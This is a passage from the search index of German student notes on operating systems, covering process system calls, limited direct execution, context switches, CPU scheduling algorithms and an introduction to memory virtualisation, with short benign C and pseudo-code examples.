ersetzt sich selbst mit <code>ls -l</code>.</li> <li>Falls <code>exec()</code> erfolgreich ist, l\u00e4uft der alte Code nicht weiter.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/2.%20Einf%C3%BChrung%20in%20Prozesse/#5-kill-prozesse-beenden","title":"\ud83d\udd2a 5\ufe0f\u20e3 <code>kill()</code> - Prozesse beenden","text":"<p>Ein Prozess kann mit <code>kill(pid, SIGNAL)</code> ein anderes Programm beenden.</p> <p>\ud83d\udccc Beispiel: </p><pre><code>#include &lt;signal.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    pid_t child = fork();\n    if (child) {  \n        sleep(5);\n        kill(child, SIGKILL);\n    } else {  \n        while (1);  // Endlosschleife, bis es beendet wird\n    }\n    return 0;\n}\n</code></pre><p></p> <p>\u2705 Erkl\u00e4rung:</p> <ul> <li>Elternprozess wartet 5 Sekunden und beendet das Kind dann mit <code>SIGKILL</code>.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/2.%20Einf%C3%BChrung%20in%20Prozesse/#6-kommunikation-zwischen-prozessen-pipe","title":"\ud83d\udd17 6\ufe0f\u20e3 Kommunikation zwischen Prozessen: <code>pipe()</code>","text":"<p>Mit Pipes k\u00f6nnen Prozesse miteinander kommunizieren.</p> <p>\ud83d\udccc Beispiel:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    int fd[2];  \n    pipe(fd);\n    pid_t child = fork();\n\n    if (child == 0) {  // Kindprozess\n        close(fd[1]);  // Schreibe-Ende schlie\u00dfen\n        char buffer[100];\n        read(fd[0], buffer, 100);\n        printf(\"Empfangene Nachricht: %s\\n\", buffer);\n    } else {  // Elternprozess\n        close(fd[0]);  // Lese-Ende schlie\u00dfen\n        char message[] = \"Hallo, Kindprozess!\";\n        write(fd[1], message, sizeof(message));\n        wait(NULL);\n    }\n    return 0;\n}\n</code></pre> <p>\u2705 Ergebnis:</p> <pre><code>Empfangene Nachricht: Hallo, Kindprozess!\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/2.%20Einf%C3%BChrung%20in%20Prozesse/#7-fazit","title":"\ud83d\ude80 7\ufe0f\u20e3 Fazit","text":"<ul> <li><code>fork()</code> erstellt einen neuen Prozess.</li> <li><code>wait()</code> sorgt f\u00fcr synchronisierte Ausf\u00fchrung zwischen Eltern und Kind.</li> <li><code>exec()</code> startet ein neues Programm im selben Prozess.</li> <li><code>kill()</code> kann Prozesse beenden.</li> <li><code>pipe()</code> erm\u00f6glicht Interprozesskommunikation.</li> </ul> <p>Diese System Calls sind das Fundament jedes modernen Betriebssystems! \ud83d\udd25</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/3.%20Mechanismen%20Limited%20Direct%20Execution/","title":"Mechanism: Limited Direct Execution","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/3.%20Mechanismen%20Limited%20Direct%20Execution/#mechanism-limited-direct-execution","title":"Mechanism: Limited Direct Execution","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/3.%20Mechanismen%20Limited%20Direct%20Execution/#1-ziel-von-cpu-virtualisierung","title":"\ud83d\udcda 1\ufe0f\u20e3 Ziel von CPU-Virtualisierung","text":"<p>Das Ziel ist, jeden Prozess so erscheinen zu lassen, als h\u00e4tte er die gesamte CPU f\u00fcr sich. Da jedoch mehrere Prozesse gleichzeitig ausgef\u00fchrt werden m\u00fcssen, teilt das Betriebssystem die CPU durch Zeitslicing (Time-Sharing) auf.</p> <p>Herausforderungen:</p> <ul> <li>Performance: Wie kann Virtualisierung effizient ohne Overhead implementiert werden?</li> <li>Kontrolle: Wie kann das OS Prozesse effizient ausf\u00fchren, aber trotzdem die Kontrolle behalten?</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/3.%20Mechanismen%20Limited%20Direct%20Execution/#2-direkte-ausfuhrung-direct-execution","title":"\u26a1 2\ufe0f\u20e3 Direkte Ausf\u00fchrung (Direct Execution)","text":"<p>Beim direkten Ausf\u00fchren l\u00e4uft ein Benutzerprozess direkt auf der CPU:</p> <ol> <li>Eintrag in die Prozessliste erstellen.</li> <li>Speicher zuweisen und Programm laden.</li> <li>Register setzen, dann <code>main()</code> aufrufen.</li> <li>Prozess l\u00e4uft direkt auf der CPU.</li> </ol> <p>\ud83d\udca1 Problem: Ohne Einschr\u00e4nkungen k\u00f6nnte ein Prozess unkontrolliert laufen - das OS h\u00e4tte keine Kontrolle \u00fcber CPU-Zeit oder kritische Systemressourcen.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/3.%20Mechanismen%20Limited%20Direct%20Execution/#3-probleme-der-direkten-ausfuhrung","title":"\ud83d\udea8 3\ufe0f\u20e3 Probleme der direkten Ausf\u00fchrung","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/3.%20Mechanismen%20Limited%20Direct%20Execution/#problem-1-geschutzte-operationen","title":"Problem 1: Gesch\u00fctzte Operationen","text":"<p>Was passiert, wenn ein Prozess eine kritische Aktion ausf\u00fchren m\u00f6chte, z. B.:</p> <ul> <li>I/O-Anfragen an eine Festplatte senden?</li> <li>Mehr Speicher oder CPU-Zeit anfordern?</li> </ul> <p>\ud83d\udd39 L\u00f6sung: Gesch\u00fctzter Kontrolltransfer \u2192 Es gibt zwei Modi f\u00fcr die CPU:</p> <ol> <li>User Mode: Normale Programme k\u00f6nnen nicht direkt auf Hardware zugreifen.</li> <li>Kernel Mode: Das Betriebssystem kann alle Systemressourcen verwalten.</li> </ol> <p>\ud83d\udd39 Systemaufruf (System Call):</p> <ul> <li>Benutzerprozesse k\u00f6nnen keine direkten I/O-Operationen ausf\u00fchren.</li> <li>Stattdessen nutzen sie System Calls (<code>syscall</code>), um das OS um Erlaubnis zu bitten.</li> </ul> <p>\ud83d\udca1 Ablauf eines System Calls:</p> <ol> <li>Der Benutzerprozess f\u00fchrt eine Trap-Instruktion aus.</li> <li>CPU wechselt in den Kernel Mode.</li> <li>OS bearbeitet den System Call (z. B. Datei \u00f6ffnen).</li> <li>CPU kehrt in den User Mode zur\u00fcck.</li> </ol> <p>\ud83d\udccc Beispiel f\u00fcr einen System Call in C:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    write(1, \"Hello, World!\\n\", 14); // System Call f\u00fcr die Ausgabe auf stdout\n    return 0;\n}\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/3.%20Mechanismen%20Limited%20Direct%20Execution/#problem-2-prozesswechsel-context-switch","title":"Problem 2: Prozesswechsel (Context Switch)","text":"<p>Damit mehrere Prozesse gleichzeitig laufen k\u00f6nnen, muss das OS zwischen Prozessen umschalten.</p> <p>\ud83d\udd39 L\u00f6sungen f\u00fcr CPU-Kontrolle:</p> <ol> <li> <p>Kooperativer Ansatz:</p> <ul> <li>Prozesse geben freiwillig die CPU ab (<code>yield</code> oder <code>sleep</code>).</li> <li>Problem: Ein Prozess kann in einer Endlosschleife h\u00e4ngen \u2192 System blockiert.</li> <li> <p>Erzwungener Ansatz (Timer-Interrupts):</p> </li> <li> <p>Das OS startet einen Timer, der regelm\u00e4\u00dfig Interrupts ausl\u00f6st.</p> </li> <li>Sobald der Timer abl\u00e4uft, wird die aktuelle Prozessausf\u00fchrung gestoppt.</li> <li>Das OS entscheidet, ob ein neuer Prozess gestartet wird.</li> </ul> </li> </ol> <p>\ud83d\udd39 Ablauf eines erzwungenen Prozesswechsels:</p> <ol> <li>Timer l\u00e4uft ab \u2192 Interrupt wird ausgel\u00f6st.</li> <li>Der aktuelle Prozess wird unterbrochen.</li> <li>Das OS speichert den aktuellen Zustand (Registersicherung).</li> <li>Das OS w\u00e4hlt einen neuen Prozess.</li> <li>Der neue Prozess wird geladen, und seine Register werden wiederhergestellt.</li> <li>Der neue Prozess l\u00e4uft weiter.</li> </ol> <p>\ud83d\udccc Beispiel f\u00fcr einen Timer-Interrupt in C (Linux Kernel)</p> <pre><code>void timer_interrupt_handler() {\n    save_process_state(); // Zustand des aktuellen Prozesses sichern\n    select_next_process(); // N\u00e4chsten Prozess ausw\u00e4hlen\n    restore_process_state(); // Zustand des neuen Prozesses laden\n}\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/3.%20Mechanismen%20Limited%20Direct%20Execution/#4-context-switch-wechsel-zwischen-prozessen","title":"\ud83d\udd04 4\ufe0f\u20e3 Context Switch: Wechsel zwischen Prozessen","text":"<p>Beim Wechsel zwischen Prozessen muss das OS sicherstellen, dass keine Daten verloren gehen.</p> <p>\ud83d\udd39 Wichtige Schritte beim Context Switch:</p> <ol> <li>Speichern des aktuellen Prozessstatus (Register, Stack-Pointer).</li> <li>Wechsel in den Kernel Mode.</li> <li>Laden des neuen Prozessstatus.</li> <li>Wechsel zur\u00fcck in den User Mode.</li> </ol> <p>\ud83d\udd39 Prozess hat zwei Stacks:</p> <ul> <li>User Stack: Speichert lokale Variablen und R\u00fccksprungadressen f\u00fcr Benutzerprozesse.</li> <li>Kernel Stack: Speichert Systemaufrufe und Prozesszust\u00e4nde f\u00fcr das Betriebssystem.</li> </ul> <p>\ud83d\udca1 Prozesswechsel erfolgt \u00fcber den \u201eDispatcher\u201c, eine OS-Funktion, die Prozesse pausiert und neue l\u00e4dt.</p> <p>\ud83d\udccc Beispiel f\u00fcr Context Switch in Pseudo-Code:</p> <pre><code>SAVE_CURRENT_PROCESS_STATE()\nCHOOSE_NEXT_PROCESS()\nRESTORE_PROCESS_STATE()\nSWITCH_TO_USER_MODE()\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/3.%20Mechanismen%20Limited%20Direct%20Execution/#5-fazit","title":"\ud83c\udfaf 5\ufe0f\u20e3 Fazit","text":"<ul> <li>Direkte Ausf\u00fchrung ist effizient, ben\u00f6tigt aber Sicherheitsmechanismen.</li> <li>Systemaufrufe erm\u00f6glichen kontrollierten Zugriff auf Hardware.</li> <li>Timer-Interrupts verhindern Endlosschleifen und CPU-Hogging.</li> <li>Context Switches sorgen f\u00fcr Multitasking und effiziente CPU-Nutzung.</li> </ul> <p>\ud83d\udca1 Ohne diese Mechanismen k\u00f6nnte ein einzelner Prozess das gesamte System \u00fcbernehmen!</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/4.%20Einf%C3%BChrung%20in%20die%20CPU-Scheduling/","title":"Einf\u00fchrung in die CPU-Scheduling","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/4.%20Einf%C3%BChrung%20in%20die%20CPU-Scheduling/#einfuhrung-in-die-cpu-scheduling","title":"Einf\u00fchrung in die CPU-Scheduling","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/4.%20Einf%C3%BChrung%20in%20die%20CPU-Scheduling/#1-einfuhrung","title":"\ud83d\udcda 1\ufe0f\u20e3 Einf\u00fchrung","text":"<p>CPU-Scheduling bestimmt, welcher Prozess die CPU bekommt und wann. Da mehrere Prozesse gleichzeitig um die CPU konkurrieren, muss das Betriebssystem faire und effiziente Zuweisungen treffen.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/4.%20Einf%C3%BChrung%20in%20die%20CPU-Scheduling/#wichtige-begriffe","title":"\ud83d\udd11 Wichtige Begriffe","text":"<ul> <li>Prozesszust\u00e4nde: Ready, Running, Blocked</li> <li>Workload: Menge von Jobs mit Ankunftszeit, Laufzeit, I/O-Bedarf</li> <li>Scheduler: W\u00e4hlt, welcher Prozess als n\u00e4chster l\u00e4uft</li> <li>Wichtige Metriken:</li> </ul> Englischer Begriff Beschreibung Formel Throughput Anzahl abgeschlossener Prozesse pro Zeiteinheit \\(Throughput=\\frac{Gesamtzeit}{Anzahl\u00a0der\u00a0abgeschlossenen\u00a0Prozesse}\\)\u200b Waiting Time Zeit, die ein Prozess in der Ready-Queue verbringt \\(Waiting\u00a0Time=Turnaround\u00a0Time\u2212Burst\u00a0Time\\) Response Time Zeit von der Ankunft bis zum ersten CPU-Zugriff \\(Response\u00a0Time=Startzeit\u2212Ankunftszeit\\) Fairness Gleichm\u00e4\u00dfige Verteilung der CPU-Zeit auf Prozesse Keine feste Formel, wird durch Scheduling-Strategien bestimmt Turnaround Time (TAT) Zeit von Ankunft \u2192 Abschluss eines Prozesses \\(Turnaround\u00a0Time=Completion\u00a0Time\u2212Arrival\u00a0Time\\)","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/4.%20Einf%C3%BChrung%20in%20die%20CPU-Scheduling/#2-wichtige-konzepte","title":"\ud83d\udd11 2\ufe0f\u20e3 Wichtige Konzepte","text":"<ul> <li>Prozess-Queues: Das OS verwaltet Prozesse mit Ready-Queues und Blocked-Queues.</li> <li>Wichtige CPU-Scheduling-Strategien:<ul> <li>First-Come, First-Served (FCFS): Prozesse werden in der Reihenfolge ausgef\u00fchrt, in der sie ankommen.</li> <li>Shortest Job Next (SJN): Der k\u00fcrzeste Prozess wird zuerst ausgef\u00fchrt.</li> <li>Round Robin (RR): Jeder Prozess bekommt eine feste Zeit auf der CPU (Zeitscheibenverfahren).</li> <li>Priority Scheduling: Prozesse mit hoher Priorit\u00e4t laufen zuerst.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/4.%20Einf%C3%BChrung%20in%20die%20CPU-Scheduling/#3-mechanismen-und-strategien","title":"\u2699\ufe0f 3\ufe0f\u20e3 Mechanismen und Strategien","text":"<ul> <li>Preemptive vs. Non-Preemptive Scheduling:<ul> <li>Preemptive: Das OS kann einen laufenden Prozess unterbrechen und einen anderen starten.</li> <li>Non-Preemptive: Ein Prozess l\u00e4uft, bis er von selbst fertig ist.</li> </ul> </li> <li>CPU-Burst vs. I/O-Burst: Prozesse wechseln zwischen CPU-Auslastung und I/O-Wartezeit.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/4.%20Einf%C3%BChrung%20in%20die%20CPU-Scheduling/#4-beispiel","title":"\ud83d\udcc8 4\ufe0f\u20e3 Beispiel","text":"<p>Round-Robin mit Zeitscheiben: Wenn die Zeitscheibe 100 ms betr\u00e4gt, wird ein Prozess nach 100 ms unterbrochen und der n\u00e4chste darf laufen.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/4.%20Einf%C3%BChrung%20in%20die%20CPU-Scheduling/#5-fazit","title":"\ud83c\udfaf 5\ufe0f\u20e3 Fazit","text":"<ul> <li>Scheduling-Algorithmen beeinflussen Systemleistung und Reaktionszeit.</li> <li>Kein Algorithmus ist perfekt - das OS w\u00e4hlt je nach Zielsetzung (z. B. Fairness, Latenz, Durchsatz) den besten.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/5.%20CPU-Scheduling%20-%20Multi-Level%20Feedback%20Queue%20%28MLFQ%29/","title":"Scheduling-Algorithmen","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/5.%20CPU-Scheduling%20-%20Multi-Level%20Feedback%20Queue%20%28MLFQ%29/#scheduling-algorithmen","title":"Scheduling-Algorithmen","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/5.%20CPU-Scheduling%20-%20Multi-Level%20Feedback%20Queue%20%28MLFQ%29/#first-come-first-served-fcfs","title":"\ud83d\udd00 First Come, First Served (FCFS)","text":"<p>Strategie:</p> <ul> <li>Der erste Prozess bekommt die CPU und l\u00e4uft bis zum Ende.</li> <li>Nicht-pr\u00e4emptiv \u2192 Ein langer Job blockiert alle anderen!</li> <li>Problem: Konvoi-Effekt \u2192 Schnelle Prozesse warten auf langsame.</li> </ul> \ud83d\udd0d Pseudo-Code <pre><code>queue = [P1, P2, P3]  # Prozesse in Ankunftsreihenfolge\nwhile queue:\n    process = queue.pop(0)  # N\u00e4chster Prozess wird gew\u00e4hlt\n    execute(process)  # Prozess l\u00e4uft bis zum Ende\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/5.%20CPU-Scheduling%20-%20Multi-Level%20Feedback%20Queue%20%28MLFQ%29/#shortest-job-first-sjf","title":"\ud83d\udd00 Shortest Job First (SJF)","text":"<p>Strategie:</p> <ul> <li>Immer den Prozess mit der k\u00fcrzesten verbleibenden Laufzeit zuerst w\u00e4hlen.</li> <li>Nicht-pr\u00e4emptiv (ein laufender Prozess wird nicht unterbrochen).</li> <li>Problem: Starvation \u2192 Lange Prozesse k\u00f6nnen ewig warten!</li> </ul> \ud83d\udd0d Pseudo-Code <pre><code>while jobs:\n    shortest_job = min(jobs, key=lambda x: x.runtime)\n    execute(shortest_job)\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/5.%20CPU-Scheduling%20-%20Multi-Level%20Feedback%20Queue%20%28MLFQ%29/#round-robin-rr","title":"\ud83d\udd00 Round Robin (RR)","text":"<p>Strategie:</p> <ul> <li>Jeder Prozess bekommt einen Zeitslot (z. B. 50ms), dann wird zum n\u00e4chsten gewechselt.</li> <li>Pr\u00e4emptiv \u2192 Verhindert Starvation.</li> <li>Problem: Zu kurze Zeitscheiben verursachen viele Kontextwechsel (Overhead).</li> </ul> \ud83d\udd0d Pseudo-Code <pre><code>while queue:\n    process = queue.pop(0)\n    execute(process, timeslice)  # L\u00e4uft f\u00fcr begrenzte Zeit\n    if process.remaining_time &gt; 0:\n        queue.append(process)  # Wieder in die Warteschlange\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/5.%20CPU-Scheduling%20-%20Multi-Level%20Feedback%20Queue%20%28MLFQ%29/#multi-level-feedback-queue-mlfq","title":"\ud83d\udd00 Multi-Level Feedback Queue (MLFQ)","text":"<p>Strategie:</p> <ul> <li>Mehrere Warteschlangen mit verschiedenen Priorit\u00e4ten.</li> <li>Prozesse starten in hoher Priorit\u00e4t \u2192 Falls sie lange laufen, wandern sie in niedrigere Priorit\u00e4ten.</li> <li>Optimiert f\u00fcr Interaktive Prozesse.</li> </ul> <p>![[mlfq.svg]]</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/","title":"Proportional Share Scheduling (Fair Sharing)","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#proportional-share-scheduling-fair-sharing","title":"Proportional Share Scheduling (Fair Sharing)","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#was-ist-proportional-share-scheduling","title":"\ud83c\udfaf Was ist Proportional Share Scheduling?","text":"<ul> <li>Prozesse bekommen CPU-Zeit basierend auf einer Gewichtung.</li> <li>Lotteriescheduling: Jeder Prozess bekommt Lose, mehr Lose = h\u00f6here Wahrscheinlichkeit zu laufen.</li> <li>Stridescheduling: Prozesse haben eine Schrittweite (Stride) \u2192 Der Prozess mit dem kleinsten \"Passwert\" l\u00e4uft zuerst.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#lotteriescheduling","title":"\ud83d\udccc Lotteriescheduling","text":"<ul> <li>Jeder Prozess erh\u00e4lt Lose, dann wird zuf\u00e4llig gezogen.</li> <li>Fair: \u00dcber lange Zeit bekommt jeder ungef\u00e4hr die richtige CPU-Zeit.</li> </ul> \ud83d\udd0d Pseudo-Code <pre><code>while True:\n    winner = random.choice(processes)  # Zuf\u00e4llige Auswahl\n    execute(winner)\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#stridescheduling","title":"\ud83d\udccc Stridescheduling","text":"<ul> <li>Prozesse haben eine Schrittweite \u2192 Kleinerer Stride bedeutet, h\u00e4ufiger laufen.</li> <li>Ein Prozess mit 50% CPU-Zeit bekommt doppelt so gro\u00dfe Schritte wie einer mit 25%.</li> </ul> \ud83d\udd0d Pseudo-Code <pre><code>while True:\n    process = min(queue, key=lambda p: p.pass_value)\n    execute(process)\n    process.pass_value += process.stride\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#multiprozessor-scheduling","title":"\ud83d\udd04 Multiprozessor-Scheduling","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#problemstellung","title":"\ud83c\udfaf Problemstellung","text":"<ul> <li>Wie plant man Jobs auf mehreren CPUs?</li> <li>Kann ein Prozess von einer CPU zur anderen wechseln?</li> <li>Wie verhindert man Lastungleichgewicht?</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#single-queue-scheduling","title":"\ud83d\udccc Single Queue Scheduling","text":"<ul> <li>Eine Warteschlange f\u00fcr alle CPUs.</li> <li>Problem: Hoher Synchronisationsaufwand.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#multi-queue-multiprozessor-scheduling-mqms","title":"\ud83d\udccc Multi-Queue Multiprozessor Scheduling (MQMS)","text":"<ul> <li>Jeder CPU-Kern bekommt eigene Warteschlange.</li> <li>Geringere Synchronisationskosten als Single Queue.</li> <li>Problem: Lastungleichgewicht \u2192 Eine CPU k\u00f6nnte \u00fcberlastet sein.</li> </ul> \ud83d\udd0d Pseudo-Code <pre><code>while True:\n    process = local_queue.pop(0)\n    execute(process)\n    if queue_empty:\n        steal_work()\n</code></pre> <p>![[multiprocessor_scheduling.svg]]</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#load-balancing-work-stealing","title":"\ud83d\udccc Load Balancing (Work Stealing)","text":"<ul> <li>Falls eine CPU nichts zu tun hat, klaut sie Prozesse von einer anderen CPU.</li> </ul> \ud83d\udd0d Pseudo-Code <pre><code>if local_queue.empty():\n    target_cpu = find_busy_cpu()\n    steal_process(target_cpu)\n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#linux-multiprozessor-scheduling","title":"\ud83d\udccc Linux Multiprozessor Scheduling","text":"<p>Linux verwendet mehrere Algorithmen f\u00fcr Multiprozessor-Systeme:</p> <ul> <li>O(1) Scheduler: Skalierbarer Scheduler mit mehreren Warteschlangen.</li> <li>Completely Fair Scheduler (CFS): Basiert auf virtueller Zeit \u2192 Fairer als klassische Algorithmen.</li> <li>Load Balancer: Verteilt Prozesse dynamisch zwischen CPUs.</li> </ul> <p>![[linux_sched.svg]]</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/1.%20Scheduling/6.%20CPU-Scheduling%20-%20Lottery%20Scheduling/#fazit","title":"\ud83c\udfc6 Fazit","text":"<ol> <li>Einzel-CPU-Scheduling:<ul> <li>FIFO, SJF, RR, MLFQ \u2192 Jede hat Vor- und Nachteile.</li> </ul> </li> <li>Fairness:<ul> <li>Proportional Share Scheduling (Lotterie, Stride).</li> </ul> </li> <li>Multiprozessor-Scheduling:<ul> <li>Single Queue: Einfach, aber Synchronisationsprobleme.</li> <li>Multi-Queue: Weniger Overhead, aber schwieriger zu balancieren.</li> <li>Work Stealing: Dynamische Lastverteilung.</li> </ul> </li> <li>Linux Scheduling:<ul> <li>Kombination aus priorit\u00e4tsbasiertem Scheduling und Lastverteilung.</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/0.%20Einf%C3%BChrung%20Speicherverwaltung/","title":"Einf\u00fchrung Speicherverwaltung","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/0.%20Einf%C3%BChrung%20Speicherverwaltung/#einfuhrung-speicherverwaltung","title":"Einf\u00fchrung Speicherverwaltung","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/0.%20Einf%C3%BChrung%20Speicherverwaltung/#grundlagen-der-speicher-virtualisierung","title":"\ud83d\udd0d Grundlagen der Speicher-Virtualisierung","text":"<ul> <li>Virtuelle Adressen:<ul> <li>Jede Adresse, die ein Benutzerprogramm generiert, ist virtuell.</li> <li>Das OS sorgt f\u00fcr die Illusion eines gro\u00dfen, privaten Speichers f\u00fcr jedes Programm.</li> <li>Die Hardware hilft dabei, virtuelle Adressen in physische Adressen umzuwandeln.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/0.%20Einf%C3%BChrung%20Speicherverwaltung/#warum-benotigt-das-os-speicher-virtualisierung","title":"\ud83c\udfaf Warum ben\u00f6tigt das OS Speicher-Virtualisierung?","text":"<p>1\ufe0f\u20e3 Vereinfachung f\u00fcr den Programmierer:</p> <ul> <li>Jedes Programm erh\u00e4lt einen gro\u00dfen, zusammenh\u00e4ngenden Adressraum.</li> <li>Programmierer m\u00fcssen sich keine Sorgen machen, wo Daten gespeichert werden.</li> <li>Ohne Virtualisierung w\u00e4re der Speicher begrenzt und unorganisiert.</li> </ul> <p>2\ufe0f\u20e3 Isolation und Schutz:</p> <ul> <li>Programme sollten nicht auf den Speicher anderer Programme zugreifen k\u00f6nnen.</li> <li>Verhindert ungewollte \u00dcberschreibungen oder b\u00f6sartige Manipulationen.</li> <li>Schutzmechanismen sorgen f\u00fcr eine sichere Speicherverwaltung.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/0.%20Einf%C3%BChrung%20Speicherverwaltung/#humorvolle-interaktion-zwischen-professor-und-student","title":"\ud83d\udcad Humorvolle Interaktion zwischen Professor und Student","text":"<ul> <li>Student macht einen sarkastischen Kommentar:<ul> <li>\"Es w\u00e4re ja praktisch, wenn man das Speicherlimit von Programmen anderer Leute manipulieren k\u00f6nnte.\"</li> </ul> </li> <li>Professor schl\u00e4gt eine Ethik-Vorlesung f\u00fcr den Studenten vor.</li> </ul> <p>\ud83d\udd17 O-STEP - A Dialogue on Memory Virtualization</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/0.%20Einf%C3%BChrung%20Speicherverwaltung/#fazit-schlusselkonzepte-der-speicher-virtualisierung","title":"\ud83d\udd11 Fazit: Schl\u00fcsselkonzepte der Speicher-Virtualisierung","text":"<p>\u2714 Jede Benutzeradresse ist virtuell, die OS + Hardware wandeln sie um. \u2714 Die Illusion von gro\u00dfem, zusammenh\u00e4ngendem Speicher erleichtert das Programmieren. \u2714 Schutzmechanismen verhindern unerlaubte Speicherzugriffe zwischen Prozessen. \u2714 Das OS beendet fehlerhafte Prozesse, um Systemstabilit\u00e4t zu gew\u00e4hrleisten.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/2.%20Memory%20Management/0.%20Einf%C3%BChrung%20Speicherverwaltung/#aufbau-eines-adressraums","title":"\ud83c\udfdb\ufe0f Aufbau eines Adressraums","text":"<p>Ein typischer Adressraum enth\u00e4lt folgende Bereiche:</p> <p>1\ufe0f\u20e3 Code-Segment</p> <ul> <li>Speichert den ausf\u00fchrbaren Code eines Programms.</li> <li>Bleibt w\u00e4hrend der Laufzeit unver\u00e4ndert.</li> <li>Liegt am Anfang des Adressraums.</li> </ul> <p>2\ufe0f\u20e3 Heap-Segment</p> <ul> <li>Speichert dynamisch allokierte Daten (z. B. <code>malloc()</code> in 